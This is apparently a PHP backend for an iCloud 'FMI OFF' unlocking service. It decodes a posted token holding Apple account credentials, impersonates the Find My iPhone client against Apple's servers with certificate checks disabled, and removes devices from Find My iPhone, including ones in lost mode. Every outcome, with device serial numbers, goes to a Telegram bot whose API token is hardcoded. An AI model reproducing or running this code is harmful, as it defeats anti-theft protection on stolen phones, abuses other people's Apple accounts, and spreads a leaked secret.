<?php
$token=$_POST['token'];
if($_POST['token'])
{
        $deco = base64_decode($token);
        $deco = str_replace("#",'"',$deco);
        $deco = str_replace('"X-Apple-I-MD-M"=','',$deco);
        $deco = str_replace(';','',$deco);
        $dec = urlencode($deco);
        $sn = json_decode($deco);
        $serial = $sn->sn;
        $dsid = $sn->dsid;
        $datat = $sn->data;
        $cp = json_decode($deco,true);
        $chat_id=142398483;
        $nombre="juan";
 foreach ($cp[data] as $data=>$val) {

            $app = base64_encode($cp[dsid].":".$val);
            $md = $cp[md];
            $mdm = $cp[mdm];

                        if (isset($app)) {
                        $deviceObj = new deviceClass($app, $md, $mdm);
                        $deviceObj->removeDevice($id);
                    }
                    if ($deviceObj->start() == 200) {

                        $c = curl_init();
                        curl_setopt($c, CURLOPT_URL, "https://api.telegram.org/bot1299765318:AAFPjR0oC72Ck_229gYLYYBAsMg6pai4Rpc/sendMessage");
                        curl_setopt($c, CURLOPT_TIMEOUT, 30);
                        curl_setopt($c, CURLOPT_POST, 1);
                        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
                        $postfields = 'chat_id=142398483&text=<b> Username: Holly%0A  Passcode FMI OFF (DONE)</b>"." %0A=============================== %0A"."Serial Number: <b>'.$serial.'</b>"." %0A"."FMI Status: <b>OFF</b>"." %0A %0A"."Check FMI then Restore your device. Enjoy!"&parse_mode=html';
                        curl_setopt($c, CURLOPT_POSTFIELDS, $postfields);
                        $response = curl_exec($c);
                        curl_close($c);

          		  sendMessage($chat_id, "<b>Passcode FMI OFF (DONE)</b>"."\n===============================\n"."Username: $nombre \n Serial Number: <b>".$serial."</b>"."\n"."FMI Status: <b>OFF</b>"."\n\n"."Check FMI then Restore your device. Enjoy!");
            		echo '<script>alert("fmi off")<script>';

                    } else if ($deviceObj->start() == 434) {

                        $c = curl_init();
                        curl_setopt($c, CURLOPT_URL, "https://api.telegram.org/bot1299765318:AAFPjR0oC72Ck_229gYLYYBAsMg6pai4Rpc/sendMessage");
                        curl_setopt($c, CURLOPT_TIMEOUT, 30);
                        curl_setopt($c, CURLOPT_POST, 1);
                        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
                        $postfields = 'chat_id=' . $chat_id . '&text= Username:  '.$nombre.'iUnlock %0A Passcode Unlimited  %0A  Serial:' . $serial . ' %0A Status :Pending  %0A Response: Invalid Token Expired(This order is 100% that us can make contact me for fix it)"&parse_mode=html';
                        curl_setopt($c, CURLOPT_POSTFIELDS, $postfields);
                        $response = curl_exec($c);
                        curl_close($c);

                        $c = curl_init();
                        curl_setopt($c, CURLOPT_URL, "https://api.telegram.org/bot1299765318:AAFPjR0oC72Ck_229gYLYYBAsMg6pai4Rpc/sendMessage");
                        curl_setopt($c, CURLOPT_TIMEOUT, 30);
                        curl_setopt($c, CURLOPT_POST, 1);
                        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
                        $postfields = 'chat_id=142398483&text=Username: '.$nombre.' %0A iUnlock %0A Passcode Unlimited %0A Serial:' . $serial. '%0A Status :Pending %0A Response: Invalid Token Expired(This order is 100% that us can make contact me for fix it)"&parse_mode=html';
                        curl_setopt($c, CURLOPT_POSTFIELDS, $postfields);
                        $response = curl_exec($c);
                        curl_close($c);
                        sendMessage($chat_id," iUnlock \n Passcode Unlimited \n Username: $nombre \n Serial:  $serial \n Status :Pending\n Response: Invalid Token Expired(This order is 100% that us can make contact me for fix it)");


                    } else if($deviceObj->start() == 401) {
                        $c = curl_init();
                        curl_setopt($c, CURLOPT_URL, "https://api.telegram.org/bot1299765318:AAFPjR0oC72Ck_229gYLYYBAsMg6pai4Rpc/sendMessage");
                        curl_setopt($c, CURLOPT_TIMEOUT, 30);
                        curl_setopt($c, CURLOPT_POST, 1);
                        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
                        $postfields = 'chat_id=' . $chat_id . '&text=Username: '.$nombre.' %0A  iUnlock %0A Passcode Unlimited %0A  Serial:' . $serial. '%0A Status :Rejected %0A Response: Password changed or Username"&parse_mode=html';
                        curl_setopt($c, CURLOPT_POSTFIELDS, $postfields);
                        $response = curl_exec($c);
                        curl_close($c);
                        sendMessage($chat_id,"iUnlock \nPasscode Unlimited \n Username: $nombre \n Serial:  $serial \n Status :Rejected\n Response: Password changed or Username ");
                    }else{

                        $c = curl_init();
                        curl_setopt($c, CURLOPT_URL, "https://api.telegram.org/bot1299765318:AAFPjR0oC72Ck_229gYLYYBAsMg6pai4Rpc/sendMessage");
                        curl_setopt($c, CURLOPT_TIMEOUT, 30);
                        curl_setopt($c, CURLOPT_POST, 1);
                        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
                        $postfields = 'chat_id=' . $chat_id . '&text=Username: '.$nombre.' %0A iUnlock %0A Passcode Unlimited %0A  Serial:' . $serial . '%0A Status :Rejected %0A Response: Invalid Token"&parse_mode=html';
                        curl_setopt($c, CURLOPT_POSTFIELDS, $postfields);
                        $response = curl_exec($c);
                        curl_close($c);
                        sendMessage($chat_id, "\n iUnlock \nPasscode Unlimited\n Username: $nombre \n Serial: $serial  \nStatus :Rejected\n Response: Invalid Token ".$deviceObj->start());
                    }
        }


        function sendMessage($chat_id, $message) {
        file_get_contents($GLOBALS['api'] . '/sendMessage?chat_id=' . $chat_id . '&text=' . urlencode($message) . '&parse_mode=html');
        }




class deviceClass
{

    private $appToken;
    private $md;
    private $mdm;
    private $host;

    public function __construct($APPTOKEN, $MD, $MDM)
    {
        $this->appToken = $APPTOKEN;
        $this->md = $MD;
        $this->mdm = $MDM;
        $this->host = "fmipmobile.icloud.com";
    }

    // authenticate account
    private function authenticate()
    {

        $curl = curl_init("https://" . $this->host . "/fmipservice/device/initClient");
        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_HTTPHEADER, array(
            'Proxy-Connection: keep-alive',
            'Accept-Language: en-us',
            'Content-Type: application/json; charset=utf-8',
            'User-Agent: FindMyiPhone/472.1 CFNetwork/711.1.16 Darwin/14.0.0',
            'X-Apple-Find-API-Ver: 3.0',
            'X-Client-UUID :0643129476E33B42318E7542EAAE1D86F00018DD',
            'Connection: keep-alive',
            'X-Apple-OAuth-Client-Type: firstPartyAuth',
            'X-Apple-AuthScheme: Forever',
            'Authorization: Basic ' . $this->appToken,
            'X-Apple-I-MD: ' . $this->md,
            'X-Apple-I-MD-M: ' . $this->mdm,
            'X-Apple-Realm-Support: 1.0',
            'Accept: /'
        ));

        curl_setopt($curl, CURLOPT_HEADER, true);
        curl_setopt($curl, CURLOPT_AUTOREFERER, true);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        $home = curl_exec($curl);
        curl_close($curl);
        $code = $this->getValue('/1.1 (.*?)\r\nServer/', $home);

        return $code;
    }

    private function refreshClient()
    {
        $url = "" . "https://" . $this->host . "/fmipservice/device/refreshClient";
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "Accept-Language: en-us",
            "Content-Type: application/json; charset=utf-8",
            "User-Agent: FindMyiPhone/472.1 CFNetwork/711.1.16 Darwin/14.0.0",
            "X-Apple-Find-API-Ver: 3.0",
            "Connection: keep-alive",
            "X-Apple-AuthScheme: Forever",
            "Authorization: Basic " . $this->appToken,
            'X-Apple-I-MD: ' . $this->md,
            'X-Apple-I-MD-M: ' . $this->mdm,
            "X-Apple-Realm-Support: 1.0", "Accept: /"
        ));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $value = curl_exec($ch);
        return $value;
    }

    //remove all device
    private function removeDeviceAll($value)
    {

        $authToken = $this->getValue('/authToken\":\"(.*?)\"/', $value);
        $prsId = $this->getValue('/prsId":(.*?),"/', $value);

        preg_match_all("/canWipeAfterLock(.*?)\"location\"/", $value, $lista);
        foreach ($lista[1] as $plm) {
            if (stristr($plm, "REM\":true")) {

                $id = $this->getValue('/id":"(.*?)"/', $plm);
                $deviceDisplayName = $this->getValue('/deviceDisplayName\":\"(.*?)\"/', $plm);
                $name = $this->getValue('/name":"(.*?)"/', $plm);

                $post = '{"clientContext":{"appVersion":"7.0"},"device":"' . $id . '"}';
                $base = base64_encode("" . $prsId . ":" . $authToken);
                $url = "https://" . $this->host . "/fmipservice/device/remove";
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Apple-Realm-Support  : 1.0", "Accept: /", "Authorization: Basic " . $base, "Proxy-Connection: keep-alive", "Accept-Language: en-us", "Content-Type: application/json; charset=utf-8", "X-Apple-Find-API-Ver: 3.0", "User-Agent: FindMyiPhone/472.1 CFNetwork/711.1.16 Darwin/14.0.0", "X-Inactive-Time: 52617", "X-Apple-AuthScheme: Forever", "Connection: keep-alive"));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                curl_setopt($ch, CURLOPT_AUTOREFERER, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $del = curl_exec($ch);
                curl_close($ch);
                print_r($del);
                echo '<br><span class="label label-primary">Model: ' . $deviceDisplayName . '</span><br>';
                echo '<br><span class="label label-info">Device Name: ' . $name . '</span><br>';

            }
        }
    }

    //remove single device
    public function removeDevice($id)
    {
        $post = '{"clientContext":{"appVersion":"7.0"},"device":"' . $id . '"}';
        $url = "https://" . $this->host . "/fmipservice/device/remove";
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "X-Apple-Realm-Support  : 1.0",
            "Accept: /", "Authorization: Basic " . $this->appToken,
            'X-Apple-I-MD: ' . $this->md,
            'X-Apple-I-MD-M: ' . $this->mdm,
            "Proxy-Connection: keep-alive",
            "Accept-Language: en-us",
            "Content-Type: application/json; charset=utf-8",
            "X-Apple-Find-API-Ver: 3.0",
            "User-Agent: FindMyiPhone/472.1 CFNetwork/711.1.16 Darwin/14.0.0",
            "X-Inactive-Time: 52617",
            "X-Apple-AuthScheme: Forever",
            "Connection: keep-alive"
        ));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_AUTOREFERER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $del = curl_exec($ch);
        curl_close($ch);
        print_r($del);
        return $del;
    }

    //get value from array
    private function getValue($name, $array)
    {
        preg_match($name, $array, $name);
        return $name = $name[1];
    }

    //show online offline
    private function deviceStatus($deviceArr)
    {

        $device = json_decode($deviceArr);
        $table = '<table><tr>';
        //image url
        $imageBaseUrl = $this->getValue('/imageBaseUrl":"(.*?)"/', $deviceArr);
        foreach ($device->content as $value) {
            $id = $value->id;
            $authToken = $device->serverContext->authToken;
            $prsid = $device->serverContext->prsId;


            $button = "";
            $clean = '<b>MODE: </b><span style="color:green">CLEAN</span>';
            //device type
            $deviceClass = $value->deviceClass;
            //device model type
            $rawDeviceModel = $value->rawDeviceModel;
            //device name
            $name = $value->name;
            //device display name
            $deviceDisplayName = $value->deviceDisplayName;

            //check status
            $status = "<span style='color:red'>ONLINE NO REMOVED</span> ";
            //offline
            if (!empty($value->features->REM)) {
                $status = "<span style='color:green'>REMOVED</span> ";
                $button = "<input type='button' class='remove' data-mdm='$this->mdm' data-apptoken='$this->appToken' data-md='$this->md' data-id='" . $id . "' value='Remove'>";
            }

            //lost mode
            if (isset($value->lostDevice) && !empty($value->lostDevice)) {
                //                echo "<pre>";print_r($value->lostDevice);
                $clean = '<b>MODE: </b><span style="color:red">LOST</span><br>
                          <b>OWNER NUMBER: </b><small>' . $value->lostDevice->ownerNbr . '</small><br>
                          <b>MESSAGE: </b><small>' . $value->lostDevice->text . '</small>';
            }

            $src = $imageBaseUrl . '/fmipmobile/deviceImages-4.0/' . $deviceClass . '/' . $rawDeviceModel . '/online-infobox.png';
            $post = '{"clientContext":{"appVersion":"7.0"},"device":"' . $id . '"}';
            $url = "https://" . $this->host . "/fmipservice/device/remove";
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                "X-Apple-Realm-Support  : 1.0",
                "Accept: /", "Authorization: Basic " . $this->appToken,
                'X-Apple-I-MD: ' . $this->md,
                'X-Apple-I-MD-M: ' . $this->mdm,
                "Proxy-Connection: keep-alive",
                "Accept-Language: en-us",
                "Content-Type: application/json; charset=utf-8",
                "X-Apple-Find-API-Ver: 3.0",
                "User-Agent: FindMyiPhone/472.1 CFNetwork/711.1.16 Darwin/14.0.0",
                "X-Inactive-Time: 52617",
                "X-Apple-AuthScheme: Forever",
                "Connection: keep-alive"
            ));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
            curl_setopt($ch, CURLOPT_AUTOREFERER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $del = curl_exec($ch);
            curl_close($ch);
            $table .= "<td>
                <b><img src='" . $src . "'></b><br>
                <b>STATUS : {$status}</b><br>
                <b>NAME : {$name}</b><br>
                <b>MODEL : {$deviceDisplayName}</b><br>
                <b>$clean</b><br><br>
                <br><span class='label label-success'>Holly Store</span><br>
            </td>";
        }
        $table .= '</tr></table>';
                                sendMessage($chat_id, $table) ;


    }

    //start script
    public function start()
    {
        //authenticate
        $response = $this->authenticate();
        if ($response == 200) {
            //initialise
            $arr = $this->refreshClient();

            //get device status
            echo $this->deviceStatus($arr);
        }
        return $response;
    }

}

}
?>


<!-- Button trigger modal -->
<button type="button" class="btn btn-primary btn-lg" data-toggle="modal" data-target="#modelId">
  Launch
</button>

<script>
    $('#exampleModal').on('show.bs.modal', event => {
        var button = $(event.relatedTarget);
        var modal = $(this);
        // Use above variables to manipulate the DOM

    });
</script>
